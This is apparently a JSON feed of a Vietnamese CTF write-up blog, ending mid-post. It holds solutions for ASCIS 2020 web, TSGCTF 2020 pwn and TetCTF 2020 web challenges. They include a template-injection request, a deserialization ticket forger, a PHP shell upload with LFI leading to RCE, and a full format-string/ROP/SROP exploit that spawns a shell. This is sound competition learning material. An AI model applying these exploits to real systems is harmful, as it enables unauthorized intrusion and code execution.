{
  "version": "https://jsonfeed.org/version/1",
  "title": "son&#39;s blog",
  "home_page_url": "https://quynh0n.github.io/",
  "feed_url": "https://quynh0n.github.io/feed/feed.json",
  "description": "I am writing about my experiences as a naval navel-gazer.",
  "author": {
    "name": "Son Tran",
    "url": "https://quynh0n.github.io/about-me/"
  },
  "items": [{
      "id": "https://quynh0n.github.io/posts/ascis-2020-quals-web-short-writeup/",
      "url": "https://quynh0n.github.io/posts/ascis-2020-quals-web-short-writeup/",
      "title": "ASCIS 2020 Quals - Web",
      "content_html": "<h2 id=\"tsulott3\">TSULOTT3 <a class=\"direct-link\" href=\"#tsulott3\">#</a></h2>\n<pre><code>POST /\n\nname={% set x=session.update({'check': 'access', 'jackpot': ''}) %}&amp;ok=\n</code></pre>\n<pre><code>POST /guess\n\njackpot=\n</code></pre>\n<h2 id=\"among_us\">among_us <a class=\"direct-link\" href=\"#among_us\">#</a></h2>\n<ol>\n<li>Viết PHP script để generate ra <code>ticket</code> và password mới cho user</li>\n</ol>\n<pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span><br><span class=\"highlight-line\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">CrewMate</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token single-quoted-string string\">'tsu'</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$secret_number</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\"><span class=\"token punctuation\">}</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"><span class=\"token variable\">$arr</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">CrewMate</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\"><span class=\"token variable\">$se</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"><span class=\"token keyword\">echo</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$se</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">.</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"><span class=\"token variable\">$de</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$se</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\"><span class=\"token variable\">$secret_number</span> <span class=\"token operator\">=</span> <span class=\"token function\">strtoupper</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$de</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">secret_number</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\"><span class=\"token variable\">$random_rand</span> <span class=\"token operator\">=</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$secret_number</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\"><span class=\"token function\">srand</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$random_rand</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\"><span class=\"token variable\">$new_password</span> <span class=\"token operator\">=</span> <span class=\"token double-quoted-string string\">\"\"</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\"><span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$new_password</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">30</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">    <span class=\"token variable\">$new_password</span> <span class=\"token punctuation\">.</span><span class=\"token operator\">=</span> <span class=\"token function\">strval</span><span class=\"token punctuation\">(</span><span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\"><span class=\"token punctuation\">}</span></span><br><span class=\"highlight-line\"><span class=\"token keyword\">echo</span> <span class=\"token single-quoted-string string\">'New password: '</span> <span class=\"token punctuation\">.</span> <span class=\"token variable\">$new_password</span> <span class=\"token punctuation\">.</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span></span><br><span class=\"token delimiter important\">?></span></span></code></pre>\n<ol start=\"2\">\n<li>Viết Python script để tự động hóa việc lấy token để đăng nhập</li>\n</ol>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"highlight-line\"><span class=\"token keyword\">from</span> re <span class=\"token keyword\">import</span> findall</span><br><span class=\"highlight-line\"><span class=\"token keyword\">from</span> hashlib <span class=\"token keyword\">import</span> md5</span><br><span class=\"highlight-line\"><span class=\"token keyword\">import</span> requests</span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">REGEX_TOKEN <span class=\"token operator\">=</span> <span class=\"token string\">r'name=\"token\" value=\"(.*?)\"'</span></span><br><span class=\"highlight-line\">PHPSESSID <span class=\"token operator\">=</span> <span class=\"token string\">''</span> <span class=\"token comment\"># Nhập PHPSESSID vào biến</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">    res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'http://35.240.156.48/?page=forgot'</span><span class=\"token punctuation\">,</span> cookies<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">        <span class=\"token string\">'PHPSESSID'</span><span class=\"token punctuation\">:</span> PHPSESSID</span><br><span class=\"highlight-line\">    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">    token <span class=\"token operator\">=</span> findall<span class=\"token punctuation\">(</span>REGEX_TOKEN<span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></span><br><span class=\"highlight-line\">    res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span><span class=\"token string\">'http://35.240.156.48/?page=forgot'</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">        <span class=\"token string\">'ticket'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'Tzo4OiJDcmV3TWF0ZSI6Mjp7czo0OiJu[redacted]'</span><span class=\"token punctuation\">,</span> <span class=\"token comment\"># Ticket được lấy từ PHP script ở trên</span></span><br><span class=\"highlight-line\">        <span class=\"token string\">'token'</span><span class=\"token punctuation\">:</span> token</span><br><span class=\"highlight-line\">    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> cookies<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">        <span class=\"token string\">'PHPSESSID'</span><span class=\"token punctuation\">:</span> PHPSESSID</span><br><span class=\"highlight-line\">    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">    res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'http://35.240.156.48/?page=login'</span><span class=\"token punctuation\">,</span> cookies<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">        <span class=\"token string\">'PHPSESSID'</span><span class=\"token punctuation\">:</span> PHPSESSID</span><br><span class=\"highlight-line\">    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">    token <span class=\"token operator\">=</span> findall<span class=\"token punctuation\">(</span>REGEX_TOKEN<span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></span><br><span class=\"highlight-line\">    res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span><span class=\"token string\">'http://35.240.156.48/?page=login'</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">        <span class=\"token string\">'username'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'tsu'</span><span class=\"token punctuation\">,</span></span><br><span class=\"highlight-line\">        <span class=\"token string\">'password'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'117856802212731241191535857466'</span><span class=\"token punctuation\">,</span> <span class=\"token comment\"># Password được lấy từ PHP script ở trên</span></span><br><span class=\"highlight-line\">        <span class=\"token string\">'token'</span><span class=\"token punctuation\">:</span> token</span><br><span class=\"highlight-line\">    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> cookies<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">        <span class=\"token string\">'PHPSESSID'</span><span class=\"token punctuation\">:</span> PHPSESSID</span><br><span class=\"highlight-line\">    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span></span></code></pre>\n<p>Chạy cho đến khi script bị lỗi tại hàm <code>findall</code> thì dừng lại (vì login xong sẽ không còn form login nữa nên không thể lấy được token, dẫn đến lỗi).</p>\n<ol start=\"3\">\n<li>Upload 1 PHP shell và server sẽ tạo 1 file zip chứa file mình mới upload lên và sẽ được xóa cho đến khi có 1 lượt upload khác.</li>\n<li>Sử dụng lỗi LFI ở trang <code>index.php</code> + zip wrapper để include PHP shell trong file zip =&gt; RCE.</li>\n<li>Lấy flag ở trong database.</li>\n</ol>\n",
      "date_published": "2020-11-01T00:00:00+00:00"
    },{
      "id": "https://quynh0n.github.io/posts/tsgctf-2020-beginners-pwn/",
      "url": "https://quynh0n.github.io/posts/tsgctf-2020-beginners-pwn/",
      "title": "TSGCTF 2020 - Beginner&#39;s Pwn",
      "content_html": "<h2 id=\"foreword\">Foreword <a class=\"direct-link\" href=\"#foreword\">#</a></h2>\n<p>Theo như description của đề thì bài này là sự tổng hợp của các techniques như:</p>\n<ul>\n<li>Format String</li>\n<li>GOT (Global Offset Table) overwrite</li>\n<li>Buffer Overflow</li>\n<li>ROP (Return-Oriented Programming)</li>\n<li>sigreturn syscall (aka SROP)</li>\n</ul>\n<p>Thì chúng ta chỉ việc follow theo đấy mà làm thôi.</p>\n<h2 id=\"exploit\">Exploit <a class=\"direct-link\" href=\"#exploit\">#</a></h2>\n<p><img src=\"/img/tsgctf-2020/main_fn.jpg\" alt=\"\"><br>\n<img src=\"/img/tsgctf-2020/checksec.jpg\" alt=\"\"></p>\n<p>Như chúng ta thấy thì NX và Canary đều được enabled (đại khái là không thể chạy shellcode và buffer overflow như bình thường). Nhưng bài này có Format String (đặc trưng của lỗi Format String là chúng ta có thể ghi được mọi address, miễn là có quyền write) nên chúng ta có thể bypass được Canary.</p>\n<h3 id=\"idea\">Idea <a class=\"direct-link\" href=\"#idea\">#</a></h3>\n<p>Idea của em trong bài này step-by-step như sau:</p>\n<ol>\n<li>Overwrite <code>__stack_chk_fail</code> GOT address để tránh exit program khi đè qua canary</li>\n<li>Ghi <code>format</code> string của hàm <code>scanf</code> lên section có quyền write (ở đây là .bss section)</li>\n<li>Làm <code>rax=0xf</code> khi chạy qua hàm scanf để gọi <code>sys_rt_sigreturn</code> syscall</li>\n<li>Craft 1 stack frame bằng <code>pwntools</code> để chạy <code>sys_execve</code> syscall</li>\n</ol>\n<h3 id=\"exploit-analyse\">Exploit Analyse <a class=\"direct-link\" href=\"#exploit-analyse\">#</a></h3>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"highlight-line\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">binary <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./beginners_pwn'</span><span class=\"token punctuation\">,</span> checksec<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'35.221.81.216'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30002</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">got_table <span class=\"token operator\">=</span> binary<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_GLOBAL_OFFSET_TABLE_'</span><span class=\"token punctuation\">]</span></span><br><span class=\"highlight-line\">start_main_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x401203</span></span><br><span class=\"highlight-line\">end_main_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x401256</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">pop_rdi_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x4012c3</span></span><br><span class=\"highlight-line\">pop_rsi_r15_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x4012c1</span></span><br><span class=\"highlight-line\">syscall <span class=\"token operator\">=</span> <span class=\"token number\">0x40118f</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'%7$s%s'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'got.__stack_chk_fail'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span>end_main_ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># đoạn này slice đi 1 byte cao để không bị đè với hàm ngay bên dưới __stack_chk_fail là scanf</span></span><br><span class=\"highlight-line\">p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">'A'</span><span class=\"token operator\">*</span><span class=\"token number\">24</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>end_main_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>start_main_ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># đoạn này phải 16 bytes stack-aligned</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'%7$s%s'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>got_table<span class=\"token operator\">+</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">'%1$s'</span><span class=\"token operator\">*</span><span class=\"token number\">0xf</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># ghi '%1$s' 15 lần vào .bss</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>got_table<span class=\"token operator\">+</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rsi_r15_ret<span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>got_table<span class=\"token operator\">+</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'plt.__isoc99_scanf'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\"><span class=\"token comment\"># scanf(format=got_table+0x30, varargs=got_table+0x80)</span></span><br><span class=\"highlight-line\"><span class=\"token comment\"># sau khi nhập 15 lần '/bin/sh' (line 45) vào scanf thì lúc đó rax=0xf và nhảy vào syscall luôn</span></span><br><span class=\"highlight-line\"><span class=\"token comment\"># '/bin/sh' sẽ luôn được ghi vào cùng 1 địa chỉ là argument đầu tiên (ở đây chính là got_table+0x80)</span></span><br><span class=\"highlight-line\">payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"><span class=\"token comment\"># Setup stack frame cho Sigreturn</span></span><br><span class=\"highlight-line\">frame <span class=\"token operator\">=</span> SigreturnFrame<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">frame<span class=\"token punctuation\">.</span>rax <span class=\"token operator\">=</span> <span class=\"token number\">0x3b</span> <span class=\"token comment\"># sys_execve</span></span><br><span class=\"highlight-line\">frame<span class=\"token punctuation\">.</span>rdi <span class=\"token operator\">=</span> got_table<span class=\"token operator\">+</span><span class=\"token number\">0x80</span> <span class=\"token comment\"># '/bin/sh\\x00'</span></span><br><span class=\"highlight-line\">frame<span class=\"token punctuation\">.</span>rsi <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token comment\"># reset rsi</span></span><br><span class=\"highlight-line\">frame<span class=\"token punctuation\">.</span>rdx <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token comment\"># reset rdx</span></span><br><span class=\"highlight-line\">frame<span class=\"token punctuation\">.</span>rip <span class=\"token operator\">=</span> syscall <span class=\"token comment\"># jump tới syscall address để gọi sys_execve</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">payload <span class=\"token operator\">+=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>frame<span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">'A'</span><span class=\"token operator\">*</span><span class=\"token number\">24</span> <span class=\"token operator\">+</span> payload<span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">p<span class=\"token punctuation\">.</span>sendlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">'/bin/sh\\x00'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span><span class=\"token number\">0xf</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># Gửi '/bin/sh\\x00' 15 lần</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></span></code></pre>\n",
      "date_published": "2020-07-15T00:00:00+00:00"
    },{
      "id": "https://quynh0n.github.io/posts/tetctf-2020-web-writeup/",
      "url": "https://quynh0n.github.io/posts/tetctf-2020-web-writeup/",
      "title": "TetCTF 2020 - Web",
      "content_html": "<h2 id=\"wysinwyg\">WYSINWYG <a class=\"direct-link\" href=\"#wysinwyg\">#</a></h2>\n<pre><code>What you see is not what you get... Do you see the flag? then you don't get the flag.\n</code></pre>\n<p>Tác giả cho ta một đoạn code PHP ngắn:</p>\n<pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span><br><span class=\"highlight-line\"><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\"><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token single-quoted-string string\">'secret.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\"><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">    <span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">    <span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token operator\">===</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'a⁡'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'b⁦'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></span><br><mark class=\"highlight-line highlight-line-active\">                <span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'a⁡'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></mark><br><span class=\"highlight-line\">                <span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'b⁦'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token operator\">!==</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">                    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">                <span class=\"token punctuation\">}</span></span><br><span class=\"highlight-line\">            <span class=\"token punctuation\">}</span></span><br><span class=\"highlight-line\">        <span class=\"token punctuation\">}</span></span><br><span class=\"highlight-line\">    <span class=\"token punctuation\">}</span></span><br><span class=\"highlight-line\"><span class=\"token punctuation\">}</span></span></code></pre>\n<p>Bài này tác giả chèn 2 kí tự <a href=\"https://en.wikipedia.org/wiki/Zero-width_space\">zero-width space</a> vào sau <code>a</code> và <code>b</code> ở dòng 12.</p>\n<p>PoC:</p>\n<pre><code>/?a=1&amp;b=1&amp;a%E2%81%A1=1&amp;b%E2%81%A6=0\n</code></pre>\n<h2 id=\"secure-system\">Secure System <a class=\"direct-link\" href=\"#secure-system\">#</a></h2>\n<pre><code>I created a security checker, can you help audit the source?\nSource: https://drive.google.com/file/d/1vOPmS30ZrW5-Uoz-AKBef3T6no2qpvt_/view\n</code></pre>\n<p>Source code chỉ có 1 file index.php như sau:</p>\n<pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"><span class=\"token keyword\">require_once</span><span class=\"token punctuation\">(</span><span class=\"token single-quoted-string string\">'dbconnect.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\"><span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span> <span class=\"token double-quoted-string string\">\"SELECT * FROM xxxxxxxxxxxxxxxxxxx\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">fetch_assoc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'yyyyyyyyyyyyyyyyyyyy'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//Sorry It's our secret, can't share</span></span><br><span class=\"token delimiter important\">?></span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span></span><br><span class=\"highlight-line\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span></span><br><span class=\"highlight-line\">    Security Check!!! Please enter your ID to prove who are you !!!:</span><br><span class=\"highlight-line\">    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>index.php<span class=\"token punctuation\">\"</span></span> <span class=\"token 